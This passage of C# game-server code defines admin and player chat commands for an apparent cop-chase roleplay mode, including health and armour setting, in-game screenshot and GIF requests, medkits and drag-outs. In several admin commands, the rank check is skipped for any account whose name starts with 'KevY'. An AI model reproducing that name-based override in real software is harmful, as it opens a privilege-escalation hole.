            if (EPlayer.GetAccount(player).Admin < 2)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            if (target.GetSharedData<bool>("Collisions") == false)
            {
                Logs.LogAdmin(player, $"Enabled {target.Name}'s collisions");
                EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has enabled {target.Name}'s collisions.");
                target.SetSharedData("Collisions", true);

                if (target.IsInVehicle)
                {
                    target.Vehicle.SetSharedData("Collisions", true);
                }
            }
            else
            {
                Logs.LogAdmin(player, $"Disabled {target.Name}'s collisions");
                EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has disabled {target.Name}'s collisions.");
                target.SetSharedData("Collisions", false);

                if (target.IsInVehicle)
                {
                    target.Vehicle.SetSharedData("Collisions", false);
                }
            }
            return;
        }

        [Command("sethp", "!{#AFAFAF}[USAGE] sethp (target) (health)")]
        public void cmd_sethp(Player player, Player target, int health)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            if (!player.Name.Equals(target.Name) && EPlayer.GetAccount(target).Admin >= EPlayer.GetAccount(player).Admin && !player.Name.StartsWith("KevY"))
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target has higher/equal admin level than you.");
                return;
            }

            Logs.LogAdmin(player, $"Set {target.Name}'s HP to {health}.");
            //// try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:sethp:{target.Name}:health"); } catch { }

            target.Health = health;
            EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has set {target.Name}'s HP to {health}.");
            return;
        }

        [Command("viewscreenshot", "!{#AFAFAF}[USAGE] viewss (identifier) | Use 'last' for last taken screenshot", Alias = "viewss")]
        public void cmd_viewscreenshot(Player player, string identifier)
        {
            if (!EPlayer.LoggedIn(player)) return;

            if (EPlayer.GetAccount(player).Admin < 1) return;

            if (identifier.Equals("last", StringComparison.OrdinalIgnoreCase))
            {
                if (!player.HasData("LastSSIdentifier"))
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You don't have any last saved SS for this session.");
                    return;
                }

                identifier = player.GetData<string>("LastSSIdentifier");
            }

            player.TriggerEvent("ViewScreenshot", identifier);
            player.TriggerEvent("pushMsgToChat", "!{#33C446}[#] !{#FFFFFF}Viewing screenshot !{#FF6347}" + identifier + " !{#FFFFFF}now...");
            Logs.LogAdmin(player, $"View screenshot {identifier}.");
            return;
        }

        [Command("takescreenshot", "!{#AFAFAF}[USAGE] takescreenshot (target) (quality = 20) | Quality 20 is default", Alias = "takess")]
        public void cmd_takescreenshot(Player player, Player target, int quality)
        {
            if (!EPlayer.LoggedIn(player)) return;

            if (EPlayer.GetAccount(player).Admin < 1) return;

            if (!player.Name.Equals(target.Name) && EPlayer.GetAccount(target).Admin > EPlayer.GetAccount(player).Admin && !player.Name.StartsWith("KevY"))
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target has higher admin level than you.");
                return;
            }

            if (quality < 0 || quality > 100)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Quality is between 0-100! Use 20 if you have no idea.");
                return;
            }

            target.TriggerEvent("TakeScreenshot", quality, 100, $"adm_{player.Name}");
            if (EPlayer.GetAccount(player).Admin < 5) EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has requested {target.Name}'s game screenshot.");
            player.TriggerEvent("pushMsgToChat", "!{#33C446}[>>] !{#FFFFFF}The screenshot will arrive as soon as the uploading is complete. If it fails you will be notified. (Speed/time depends on target's internet)");
            Logs.LogAdmin(player, $"Take {target.Name}'s game screenshot.");
            return;
        }

        [Command("takegif", "!{#AFAFAF}[USAGE] takegif (target) (duration in seconds) (fps = 24) | Leave FPS to 24 or it'll be bad")]
        public void cmd_takegif(Player player, Player target, int duration, int fps = 24)
        {
            if (!EPlayer.LoggedIn(player)) return;

            if (EPlayer.GetAccount(player).Admin < 1) return;

            if (!player.Name.Equals(target.Name) && EPlayer.GetAccount(target).Admin > EPlayer.GetAccount(player).Admin && !player.Name.StartsWith("KevY"))
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target has higher admin level than you.");
                return;
            }

            if (target.HasData("GIF_Creating"))
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target is ALREADY creating a GIF.");
                return;
            }

            if (duration < 0 || duration > 300)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Your duration is... messed up.");
                return;
            }
            if (fps < 1 || fps > 60)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Dude the target ain't on NASA PC.");
                return;
            }

            target.TriggerEvent("TakeGIF", duration, $"adm_{player.Name}", fps);
            target.SetData("GIF_Creating", player.Name);
            if (EPlayer.GetAccount(player).Admin < 5) EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has requested {target.Name}'s game GIF.");
            player.TriggerEvent("pushMsgToChat", "!{#33C446}[>>] !{#FFFFFF}The GIF will arrive as soon as the uploading is complete. If it fails you will be notified. (GIF's take A LONG time to upload and it depends on target's net)");
            Logs.LogAdmin(player, $"Take {target.Name}'s game GIF.");
            return;
        }

        [Command("setinv", "!{#AFAFAF}[USAGE] setinv(ulnerable) (target) (0 or 1)", Alias = "setinvulnerable")]
        public void cmd_setinv(Player player, Player target, int status)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            Logs.LogAdmin(player, $"Set {target.Name}'s invulnerability to " + (status == 1 ? "on." : "off."));
            // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:setinv:{target.Name}:{status}"); } catch { }

            target.TriggerEvent("SetActorInvulnerable", status > 0 ? true : false);
            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You have toggled " + target.Name + "'s invulnerability.");
            return;
        }

        [Command("setar", "!{#AFAFAF}[USAGE] setar(mor) (target) (armor)", Alias = "setarmor,setarmour")]
        public void cmd_setar(Player player, Player target, int armour)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:setar:{target.Name}:{armour}"); } catch { }

            Logs.LogAdmin(player, $"Set {target.Name}'s AR to {armour}.");
            target.Armor = armour;
            EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has set {target.Name}'s AR to {armour}.");
            return;
        }

        [Command("stopanim", Alias = "sa")]
        public void cmd_sa(Player player)
        {
            if (player.GetSharedData<int>("Wounded") > 0)
            { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Nice try - you cannot use this while wounded!"); return; }

            if (player.HasSharedData("TasedTill") && Environment.TickCount64 < player.GetSharedData<long>("TasedTill"))
            { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot do this right now as you're tased."); return; }

            if (player.HasData("Cuffed"))
            { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot do this while cuffed."); return; }

            if (player.IsInVehicle)
            { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot do this inside of a vehicle!"); return; }

            if (!player.GetSharedData<string>("ActionType").Equals("none"))
            { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot do this while performing an action!"); return; }


            if (player.HasData("Handsup"))
            {
                player.TriggerEvent("SetHandsup", false);
                player.ResetData("Handsup");
            }
            else
            {
                Events.RequestClearAnimation(player);
                player.TriggerEvent("ClearTaskNotFalling");
                //player.StopAnimation(); // This is basically clear tasks immediately bruh.
            }
        }

        [Command("blipdbg")]
        public void cmd_blipdbg(Player player)
        {
            if (EPlayer.GetAccount(player).Admin < 5)
            {
                return;
            }
            player.SetSharedData("VisibleBlip", !player.GetSharedData<bool>("VisibleBlip"));
        }
        [Command("painkillers", "!{#AFAFAF}[USAGE] pk (option: buy/use/inv)", Alias = "pk")]
        public void cmd_painkillers(Player player, string option)
        {
            if (option == "buy")
            {
                Account acc = EPlayer.GetAccount(player);
                if (acc.Points < 6)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You need 6 points to purchase a painkiller!");
                    return;
                }
                if (acc.Painkillers >= 15)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot have more than 15 painkillers on you at once!");
                    return;
                }

                acc.Painkillers++;
                EPlayer.GivePoints(player, -6);
                player.TriggerEvent("pushMsgToChat", $"~g~You successfully purchased a painkiller for 6 points and how have !{{#FFFFFF}}{acc.Painkillers} panikillers~g~!");
                return;
            }
            else if (option == "use")
            {
                if (player.GetSharedData<int>("Team") == -1)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You can only use this in copchase!");
                    return;
                }

                if (EPlayer.GetAccount(player).Painkillers <= 0)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You do not have any painkillers! Please buy some using /pk buy.");
                    return;
                }

                if (player.GetSharedData<string>("ActionType") != "none" || player.GetSharedData<int>("ActionTime") > 0)
                { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are already performing an action!"); return; }

                if (player.HasData("Cuffed") || (player.HasSharedData("TasedTill") && Environment.TickCount64 < player.GetSharedData<long>("TasedTill")))
                { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot do this right now."); return; }

                /*if (player.IsInVehicle)
                { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot do this inside of a vehicle!"); return; }  
                */
                if (player.Health > 90)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use painkillers when your HP is above 90, aka we do not support overdosing on painkillers.");
                    return;
                }

                player.SetSharedData("ActionType", "painkiller");
                player.SetSharedData("ActionTime", 40);
                player.TriggerEvent("StartPlayerAction", "painkiller", 40);

                EPlayer.Action(player, $"takes out a small bottle containing painkillers and swallows one.");
                player.TriggerEvent("pushMsgToChat", "~y~You swallowed a painkiller and will be getting +1HP for the next 40 seconds.");
                return;
            }
            else if (option == "inv")
            {
                player.TriggerEvent("pushMsgToChat", $"~w~You have ~y~{EPlayer.GetAccount(player).Painkillers} painkillers ~w~in your inventory.");
            }
            else
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Invalid option! Valid options are: buy, use, inv.");
                return;
            }
        }

        [Command("medkit", "!{#AFAFAF}[USAGE] mk (option: buy/use/inv)", Alias = "mk")]
        public void cmd_medkit(Player player, string option)
        {
            if (option == "buy")
            {
                Account acc = EPlayer.GetAccount(player);
                if (acc.Points < 10)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You need 10 points to purchase a medkit!");
                    return;
                }
                if (acc.Medkits >= 5)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot have more than 5 medkits on you at once!");
                    return;
                }

                acc.Medkits++;
                EPlayer.GivePoints(player, -10);
                player.TriggerEvent("pushMsgToChat", $"~g~You successfully purchased a medkit for 10 points and how have !{{#FFFFFF}}{acc.Medkits} medkits~g~!");
                return;
            }
            else if (option == "use")
            {
                if (player.GetSharedData<int>("Team") == -1)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You can only use this in copchase!");
                    return;
                }

                if (EPlayer.GetAccount(player).Medkits <= 0)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You do not have any medkits! Please buy some using /mk buy.");
                    return;
                }

                if (player.GetSharedData<string>("ActionType") != "none" || player.GetSharedData<int>("ActionTime") > 0)
                { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are already performing an action!"); return; }

                if (player.HasData("Cuffed") || (player.HasSharedData("TasedTill") && Environment.TickCount64 < player.GetSharedData<long>("TasedTill")))
                { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot do this right now."); return; }

                if (player.IsInVehicle)
                { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot do this inside of a vehicle!"); return; }

                if (player.Health > 80)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use medkits when your health is above 80!");
                    return;
                }

                player.SetSharedData("ActionType", "medkit");
                player.SetSharedData("ActionTime", 10);
                player.TriggerEvent("StartPlayerAction", "medkit", 10);

                EPlayer.Action(player, $"takes out a first aid kit and starts treating their wounds.");
                player.TriggerEvent("pushMsgToChat", "~y~You are now using a medkit, this will take 10 seconds.");
                return;
            }
            else if (option == "inv")
            {
                player.TriggerEvent("pushMsgToChat", $"~w~You have ~y~{EPlayer.GetAccount(player).Medkits} medkits ~w~in your inventory.");
            }
            else
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Invalid option! Valid options are: buy, use, inv.");
                return;
            }
        }
        [Command("handsup")]
        public void cmd_handsup(Player player)
        {
            if (player.HasData("Cuffed") || (player.HasSharedData("TasedTill") && Environment.TickCount64 < player.GetSharedData<long>("TasedTill")))
            { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot do this right now."); return; }

            if (player.IsInVehicle)
            { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot do this inside of a vehicle!"); return; }

            if (!player.GetSharedData<string>("ActionType").Equals("none"))
            { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot do this while performing an action!"); return; }

            if (player.HasData("Handsup"))
            {
                player.TriggerEvent("SetHandsup", false);
                player.ResetData("Handsup");
            }
            else
            {
                player.TriggerEvent("SetHandsup", true);
                player.SetData("Handsup", true);
            }

            return;
        }
        /*
        [Command("cuff", "!{#AFAFAF}[USAGE] cuff (optional:target)")]
        public void cmd_cuff(Player player, Player target = null)
        {
            LobbyData lobby = Settings.Lobbies.Find(lobby => lobby.lobbyId == player.GetSharedData<int>("InLobby"));
            if(lobby == null)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not in a copchase lobby!");
                return;
            }

            float nearest = 9999.0f;
            if (target == null)
            {
                foreach(Player fugi in lobby.Fugitives.Where<Player>(t => t.Position.DistanceTo(player.Position) <= 3.0))
                {
                    if(player.Position.DistanceTo(fugi.Position) < nearest)
                    {
                        target = fugi;
                        nearest = player.Position.DistanceTo(fugi.Position);
                    }
                }
            }

            bool isACop = false;

            if (lobby.Cops.Contains(player) && lobby.gameStatus == 1 && lobby.Fugitives.Contains(target) && !target.HasData("Cuffed"))
            { 
                isACop = true;
            }

            if (!isACop)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not a cop or the target cannot be cuffed!");
                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}[HINT] You can use /cuff (target) to handcuff a specific player.");
                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}[HINT] Entering /cuff without any parameters will attempt to handcuff the nearest fugitive.");
                return;
            }

            if (lobby.GameProgress < 60)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot cuff right at the start of the game!");
                return;
            }

            if (player.Position.DistanceTo(target.Position) > 3.0 || target.IsInVehicle) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not near that player!"); return; }

            try
            {
                foreach (Player cop in lobby.Cops)
                {
                    if (cop.HasData("CuffingTarget") && cop.GetData<Player>("CuffingTarget") == target)
                    {
                        player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}The target is already being cuffed by someone!");
                        return;
                    }
                }
            }
            catch { }

            player.SetData("CuffingTarget", target);
            EPlayer.Action(player, $"attempts to grapple {target.Name} as they reach for their cuffs.");
            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are now cuffing the target, stay close to them for 3 seconds to complete the operation.");

            NAPI.Task.Run(() =>
            {
                try {
                    if (player != null && player.Exists)
                    {
                        if (player != null && target != null && target.Exists)
                        {
                            if (target == null || !target.IsInstanceAlive || player == null || !player.IsInstanceAlive)
                            {
                                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Operation failed, target or you are no longer alive.");
                                player.ResetData("CuffingTarget");
                                return;
                            }
                            
                            LobbyData lobbye = Settings.Lobbies.Find(lob => lob.lobbyId == player.GetSharedData<int>("InLobby"));
                            if (lobbye != null)
                            {
                                if (lobbye.Cops.Contains(player) && lobbye.gameStatus == 1 && lobbye.Fugitives.Contains(target) && !target.HasData("Cuffed"))
                                {
                                    isACop = true;
                                }
                            }

                            if (!isACop)
                            {
                                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Operation failed, you cannot cuff that target anymore.");
                                player.ResetData("CuffingTarget");
                                return;
                            }

                            if (player.Position.DistanceTo(target.Position) > 2.0)
                            {
                                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not near the target!");
                                player.ResetData("CuffingTarget");

                                return;
                            }

                            player.ResetData("CuffingTarget");

                            EPlayer.GrantXP(player, 5);
                            player.SetSharedData("FugitiveChance", player.GetSharedData<float>("FugitiveChance")+(0.2 * (double)((double)EPlayer.GetAccount(player).DonatorLevel + 1.0)));
                            EPlayer.Action(player, $"has grabbed ahold of {target.Name} and slapped the handcuffs on their wrists.");

                            EPlayer.SendMessageInLobby(lobbye.lobbyId, $"!{{#ADD8E6}}Cop {player.Name} has apprehended Fugitive {target.Name}.");

                            target.SetAccessories(7, 41, 0); // Handcuffs

                            EPlayer.Handcuff(target, true);

                            Events.RequestPlayAnimation(player, "mp_arresting", "a_uncuff", 2);

                            NAPI.Task.Run(() =>
                            {
                                lock (player)
                                {
                                    if (player != null && player.Exists)
                                    {
                                        Events.RequestClearAnimation(player);
                                    }
                                }
                            }, 2000);

                            target.Heading = player.Heading;

                            EPlayer.GetAccount(player).Arrests++;

                            Events.OnPlayerDeath(target, player, 696988); // Reason 696988 = handcuffs.
                        }
                    }
                }
                catch { }
            }, 3000);
            return;
        }
        */

        [Command("dragout", "!{#AFAFAF}[USAGE] dragout (optional:target)")]
        public void cmd_dragout(Player player, Player target = null)
        {
            LobbyData lobby = Settings.Lobbies.Find(lobby => lobby.lobbyId == player.GetSharedData<int>("InLobby"));
            if (lobby == null)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not in a copchase lobby!");
                return;
            }

            float nearest = 9999.0f;
            if (target == null)
            {
                foreach (Player fugi in lobby.Fugitives.Where<Player>(t => t.Position.DistanceTo(player.Position) <= 3.0))
                {
                    if (player.Position.DistanceTo(fugi.Position) < nearest)
                    {
                        target = fugi;
                        nearest = player.Position.DistanceTo(fugi.Position);
                    }
                }
            }

            bool isACop = false;

            if (lobby.Cops.Contains(player) && lobby.gameStatus == 1 && lobby.Fugitives.Contains(target) && target.IsInVehicle && !player.IsInVehicle)
            {
                isACop = true;
            }


            if (!isACop)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not a cop or the target cannot be dragged out right now!");
                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}[HINT] You can use /dragout (target) to drag out a specific player.");
                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}[HINT] Entering /dragout without any parameters will attempt to drag out the nearest fugitive.");
                return;
            }

            if (lobby.GameProgress < 60)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot dragout at the start of the game!");
                return;
            }

            if (player.Position.DistanceTo(target.Position) >= 3.5) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not near that player!"); return; }

            if (Settings.LoggedInPlayers.Count(a => a.HasData("DraggingOut") && a.GetData<string>("DraggingOut").Equals(target.Name) && lobby.Cops.Contains(a)) > 0)
            { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}The target is already being dragged out!"); return; }

            target.TriggerEvent("ToggleSeatbelt", false);
            target.ResetData("Seatbelt");
            EPlayer.Action(player, $"leans towards {target.Name}'s vehicle and tries to open the door to drag them out.");

            target.SetData("DragoutVehicle", target.Vehicle);
            target.SetData("ExitedDragoutVehicle", false);

            player.SetData("DraggingOut", target.Name);
            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are now dragging out the target, stay with them for 5 seconds to complete the operation.");

            NAPI.Task.Run(() =>
            {
                try
                {
                    if (player != null && player.Exists)
                    {
                        if (player != null && target != null && target.Exists)
                        {
                            if (target == null || !target.IsInstanceAlive || player == null || !player.IsInstanceAlive || player.Dead || player.GetSharedData<int>("Wounded") > 0)
                            {
                                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Operation failed, target or you are no longer alive.");
                                player.ResetData("DraggingOut");
                                return;
                            }

                            LobbyData lobbye = Settings.Lobbies.Find(lob => lob.lobbyId == player.GetSharedData<int>("InLobby"));
                            if (lobbye != null)
                            {
                                if (lobbye.Cops.Contains(player) && lobbye.gameStatus == 1 && lobbye.Fugitives.Contains(target) && target.IsInVehicle
                                    && !player.IsInVehicle)
                                {
                                    isACop = true;
                                }
                            }

                            if (!isACop)
                            {
                                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Operation failed, you cannot drag out that target anymore.");
                                player.ResetData("DraggingOut");
                                return;
                            }

                            if (target.Vehicle != target.GetData<Vehicle>("DragoutVehicle"))
                            {
                                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Operation failed, the player entered another vehicle.");
                                player.ResetData("DraggingOut");

                                target.ResetData("DragoutVehicle");
                                target.ResetData("ExitedDragoutVehicle");
                                return;
                            }
                            if (target.GetData<bool>("ExitedDragoutVehicle") == true)
                            {
                                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Operation failed, the player exited their vehicle in the middle of the process. Try again!");
                                player.ResetData("DraggingOut");

                                target.ResetData("DragoutVehicle");
                                target.ResetData("ExitedDragoutVehicle");
                                return;
                            }

                            if (player.Position.DistanceTo(target.Position) >= 3.5)
                            {
                                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not near the target!");
                                player.ResetData("DraggingOut");
                                return;
                            }

                            EPlayer.GrantXP(player, 2);
                            target.TriggerEvent("ToggleSeatbelt", false);
                            target.ResetData("Seatbelt");
                            player.SetSharedData("FugitiveChance", player.GetSharedData<float>("FugitiveChance") + (0.1 * (double)((double)EPlayer.GetAccount(player).DonatorLevel + 1.0)));
                            cmd_do(player, $"{target.Name} has been dragged out of the vehicle.");
                            player.ResetData("DraggingOut");
                            target.ResetData("DragoutVehicle");
                            target.ResetData("ExitedDragoutVehicle");

                            EPlayer.SendMessageInLobby(lobbye.lobbyId, $"!{{#ADD8E6}}Cop {player.Name} has dragged {target.Name} out of the vehicle!");
                            target.TriggerEvent("ThrowFromVehicle");
                        }
                    }
                }
                catch { }
            }, 5000);
            return;
        }

        [Command("switchseats", "!{#AFAFAF}[USAGE] switchseats (target)", Alias = "swapseats,swapseat,switchseat,ss")]
        public static void cmd_switchseats(Player player, Player target)
        {
            if ((!player.IsInVehicle || !target.IsInVehicle) || player.Vehicle != target.Vehicle && player != target)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not in the same vehicle as the target or not in one!");
                return;
            }

            if (player.HasData("_currentlySwappingSeats") || player == target) return;

            if (player.HasData("SwapSeating") && player.HasData("SwapSeatingTime") &&
                Environment.TickCount64 - player.GetData<long>("SwapSeatingTime") <= 7000)
            {
                try
                {
                    Player seatingWith = player.GetData<Player>("SwapSeating");
                    if (seatingWith.Exists && seatingWith == target) // They the one who sent requests
                    {
                        player.ResetData("Seatbelt");
                        player.TriggerEvent("ToggleSeatbelt", false);
                        target.ResetData("Seatbelt");
                        target.TriggerEvent("ToggleSeatbelt", false);

                        player.ResetData("SwapSeating");
                        player.ResetData("SwapSeatingTime");
                        target.ResetData("SwapSeating");
                        target.ResetData("SwapSeatingTime");

                        player.SetData("_currentlySwappingSeats", true);
                        target.SetData("_currentlySwappingSeats", true);

                        Vehicle hwnd = target.Vehicle;

                        int playSeat = player.VehicleSeat;
                        int targSeat = target.VehicleSeat;

                        player.Position = player.Position.Subtract(new Vector3(0.0, 0.0, 30.0f));
                        target.Position = player.Position.Subtract(new Vector3(0.0, 5.0, 30.0f));
                        hwnd.Position = hwnd.Position.Add(new Vector3(0.5, 0.5, 0.5));

                        NAPI.Task.Run(() =>
                        {
                            try
                            {
                                if (hwnd != null && player != null && target != null && player.Exists && target.Exists)
                                {
                                    NAPI.Task.Run(() =>
                                    {
                                        try
                                        {
                                            if (hwnd != null && player != null && target != null && player.Exists && target.Exists)
                                            {
                                                player.TriggerEvent("SetInVehEx", hwnd, targSeat - 1);
                                                target.TriggerEvent("SetInVehEx", hwnd, playSeat - 1);

                                                player.ResetData("_currentlySwappingSeats");
                                                target.ResetData("_currentlySwappingSeats");

                                                var msg = "!{#FFFFFF}(( !{#FF6347}" + player.Name + " and  " + target.Name + " have swapped seats." + " !{#FFFFFF}))";

                                                foreach (Player playa in NAPI.Player.GetPlayersInRadiusOfPlayer(60, player))
                                                {
                                                    if (playa.Dimension == player.Dimension) playa.TriggerEvent("pushMsgToChat", msg);
                                                }
                                            }
                                        }
                                        catch { }
                                    }, 1000);

                                    player.SetIntoVehicle(hwnd, targSeat);
                                    target.SetIntoVehicle(hwnd, playSeat);

                                    player.TriggerEvent("SetInVehEx", hwnd, targSeat - 1);
                                    target.TriggerEvent("SetInVehEx", hwnd, playSeat - 1);
                                }
                            }
                            catch { }
                        }, player.Ping + target.Ping + 500);

                        return;
                    }
                }
                catch { }
            }

            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You have sent a swapseats request to " + target.Name + ", they have 7s to accept.");
            target.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You have received a swapseats request from " + player.Name + ", you have 7s to accept. (/ss " + player.Name + ")");

            player.ResetData("SwapSeating");
            player.ResetData("SwapSeatingTime");
            target.SetData("SwapSeating", player);
            target.SetData("SwapSeatingTime", Environment.TickCount64);

            return;
        }

        [Command("forceswitchseats", "!{#AFAFAF}[USAGE] forceswitchseats (player) (target)", Alias = "forceswapseats,forceswapseat,forceswitchseat,fss")]
        public void cmd_forceswitchseats(Player admin, Player player, Player target)
        {
            if (!EPlayer.LoggedIn(admin)) return;

            Account acc = EPlayer.GetAccount(admin);

            if (acc.Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not authorized to use this command.");
                return;
            }

            if ((!player.IsInVehicle || !target.IsInVehicle) || player.Vehicle != target.Vehicle && player != target)
            {
                admin.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Players are not in the same vehicle!");
                return;
            }

            if (player.HasData("_currentlySwappingSeats") || target.HasData("_currentlySwappingSeats"))
            { admin.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target's are currently switching..."); return; }

            try
            {
                Commands.cmd_switchseats(player, target);

                NAPI.Task.Run(() => Commands.cmd_switchseats(target, player), 500 + target.Ping);
            }
            catch { admin.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}An error has occured. (FATAL)"); }

            Logs.LogAdmin(admin, $"Force-swapped seats between {player.Name} & {target.Name}.");
            // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{admin.Name}:forceswapseats:{target.Name}:{player.Name}"); } catch { }
            EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {admin.Name} has forced {player.Name} and {target.Name} to swap seats.");

            return;
        }

        [Command("takecomp", "!{#AFAFAF}[USAGE] takecomp (target) (weapon/hash) (component/hash)", GreedyArg = true)]
        public void cmd_takecomp(Player player, Player target, string wep, string component)
        {
            if (!EPlayer.LoggedIn(player) || !EPlayer.LoggedIn(target))
                return;

            if (EPlayer.GetAccount(player).Admin < 3)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not a level 3 admin.");
                return;
            }


            Int64 wephash = 0;
            bool found = false;
            jWeaponData itemData = new jWeaponData();

            if (!Int64.TryParse(wep, out wephash))
            {
                wephash = 0;
            }

            foreach (KeyValuePair<long, jWeaponData> i in Settings.WeaponData)
            {
                if (wephash != 0)
                {
                    if (i.Key == wephash)
